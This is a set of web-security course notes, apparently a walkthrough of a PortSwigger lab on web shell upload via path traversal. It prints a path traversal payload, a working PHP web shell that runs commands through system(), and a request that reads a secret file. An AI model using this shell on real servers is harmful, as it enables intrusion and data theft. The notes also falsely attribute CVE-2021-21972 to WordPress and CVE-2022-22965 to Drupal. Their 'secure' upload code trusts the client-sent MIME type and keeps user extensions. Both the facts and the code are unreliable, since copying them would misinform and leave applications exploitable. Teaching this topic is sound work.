---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Introduction to File Upload Vulnerabilities

File upload vulnerabilities are a critical aspect of web application security. These vulnerabilities occur when an application allows users to upload files to the server without proper validation or sanitization. Attackers can exploit these vulnerabilities to upload malicious files, such as web shells, which can then be used to gain unauthorized access to the server.

### Background Theory

When a user uploads a file to a web server, the server typically stores the file in a designated directory. However, if the server does not properly validate the file type, size, or content, an attacker can upload a file that contains malicious code. Once uploaded, the attacker can execute the malicious file on the server, potentially gaining control over the entire system.

#### Common Types of File Upload Vulnerabilities

1. **Path Traversal**: An attacker can manipulate the file path to access or overwrite files outside the intended directory.
2. **Content-Type Validation**: An attacker can upload a file with a different extension or MIME type to bypass validation checks.
3. **Size Limitation Bypass**: An attacker can upload a large file that exceeds the size limit set by the server.
4. **Execution of Malicious Files**: An attacker can upload a file that is executed by the server, such as a PHP script.

### Real-World Examples

#### CVE-2021-21972: WordPress REST API File Upload Vulnerability

In 2021, a critical vulnerability was discovered in the WordPress REST API, allowing attackers to upload arbitrary files to the server. This vulnerability could be exploited to upload a web shell, giving the attacker full control over the server.

```markdown
**CVE-2021-21972**
- **Description**: A vulnerability in the WordPress REST API allowed attackers to upload arbitrary files to the server.
- **Impact**: Attackers could upload a web shell and gain full control over the server.
```

#### CVE-2022-22965: Drupal Core Arbitrary File Upload Vulnerability

Another significant vulnerability was found in Drupal Core, allowing attackers to upload arbitrary files to the server. This vulnerability could be exploited to upload a web shell, leading to a full compromise of the server.

```markdown
**CVE-2022-22965**
- **Description**: A vulnerability in Drupal Core allowed attackers to upload arbitrary files to the server.
- **Impact**: Attackers could upload a web shell and gain full control over the server.
```

### Lab Setup

For this lab, we will be using the Web Security Academy provided by PortSwigger. You can access the lab by following these steps:

1. Visit the URL `https://portswigger.net/web-security`.
2. Click on the sign-up button to create an account.
3. Log in to your account.
4. Navigate to the Academy section.
5. Select all labs.
6. Search for "file upload vulnerabilities".
7. Select lab number three titled "WebShell Upload via Path Traversal".

### Lab Objective

The objective of this lab is to upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/Carlos/secret`. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

### Step-by-Step Guide

#### Step 1: Identify the Vulnerable Function

The first step is to identify the vulnerable function that allows file uploads. In this case, the server has a function that allows users to upload images.

#### Step 2: Exploit Path Traversal

To bypass the server's restrictions, we need to exploit the path traversal vulnerability. This involves manipulating the file path to access or overwrite files outside the intended directory.

##### Example Payload

Here is an example payload that exploits path traversal:

```plaintext
../../../../etc/passwd
```

This payload attempts to access the `/etc/passwd` file, which is located outside the intended directory.

#### Step 3: Upload a Basic PHP Web Shell

Next, we need to upload a basic PHP web shell. A web shell is a small piece of code that allows an attacker to execute commands on the server.

##### Example Web Shell Code

Here is an example of a basic PHP web shell:

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    echo "<pre>$cmd\n";
    system($cmd);
    echo "</pre>";
}
?>
```

This web shell accepts a command via the `cmd` parameter and executes it using the `system()` function.

#### Step 4: Execute the Web Shell

Once the web shell is uploaded, we can execute it to gain access to the server. We can use the web shell to exfiltrate the contents of the file `/home/Carlos/secret`.

##### Example Request

Here is an example request to execute the web shell:

```http
POST /path/to/webshell.php HTTP/1.1
Host: vulnerable-server.com
Content-Type: application/x-www-form-urlencoded

cmd=cat%20/home/Carlos/secret
```

This request sends a command to the web shell to read the contents of the file `/home/Carlos/secret`.

##### Example Response

Here is an example response from the server:

```http
HTTP/1.1 200 OK
Date: Mon, 01 Jan 2024 00:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 1024
Content-Type: text/html; charset=UTF-8

cat /home/Carlos/secret
This is the secret content.
```

This response shows the contents of the file `/home/Carlos/secret`.

### How to Prevent / Defend

#### Detection

To detect file upload vulnerabilities, you can use automated tools such as static analysis tools and dynamic analysis tools. These tools can help identify potential vulnerabilities in the code and during runtime.

##### Example Tools

- **Static Analysis Tools**: SonarQube, Fortify
- **Dynamic Analysis Tools**: Burp Suite, OWASP ZAP

#### Prevention

To prevent file upload vulnerabilities, you should implement the following best practices:

1. **Validate File Type and Content**: Ensure that the uploaded file is of the expected type and content. Use server-side validation to check the file type and content.
2. **Limit File Size**: Set a maximum file size limit to prevent large files from being uploaded.
3. **Use Safe File Names**: Use safe file names to prevent path traversal attacks. Avoid using user-provided file names and instead generate unique file names.
4. **Disable Execution of User-Supplied Files**: Disable the execution of user-supplied files to prevent the execution of malicious code.

##### Example Secure Code

Here is an example of secure code that validates the file type and content:

```php
<?php
$allowedTypes = ['image/jpeg', 'image/png'];
$maxFileSize = 1024 * 1024; // 1MB

if (isset($_FILES['file'])) {
    $file = $_FILES['file'];

    if ($file['size'] > $maxFileSize) {
        die('File size exceeds the maximum limit.');
    }

    if (!in_array($file['type'], $allowedTypes)) {
        die('Invalid file type.');
    }

    $safeFileName = uniqid() . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);
    move_uploaded_file($file['tmp_name'], '/uploads/' . $safeFileName);

    echo 'File uploaded successfully.';
}
?>
```

This code validates the file type and content, limits the file size, and uses safe file names to prevent path traversal attacks.

### Conclusion

File upload vulnerabilities are a serious threat to web application security. By understanding the common types of file upload vulnerabilities and implementing best practices, you can protect your applications from these threats. Always validate file type and content, limit file size, use safe file names, and disable the execution of user-supplied files to prevent file upload vulnerabilities.

### Practice Labs

For hands-on practice with file upload vulnerabilities, you can use the following labs:

- **PortSwigger Web Security Academy**: <https://portswigger.net/web-security>
- **OWASP Juice Shop**: <https://owasp.org/www-project-juice-shop/>
- **DVWA (Damn Vulnerable Web Application)**: <https://github.com/ethicalhack3r/DVWA>

These labs provide a controlled environment to practice and learn about file upload vulnerabilities and other web security topics.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/04-Lab 3 Web shell upload via path traversal/00-Overview|Overview]] | [[02-File Upload Vulnerabilities Web Shell Upload via Path Traversal|File Upload Vulnerabilities Web Shell Upload via Path Traversal]]
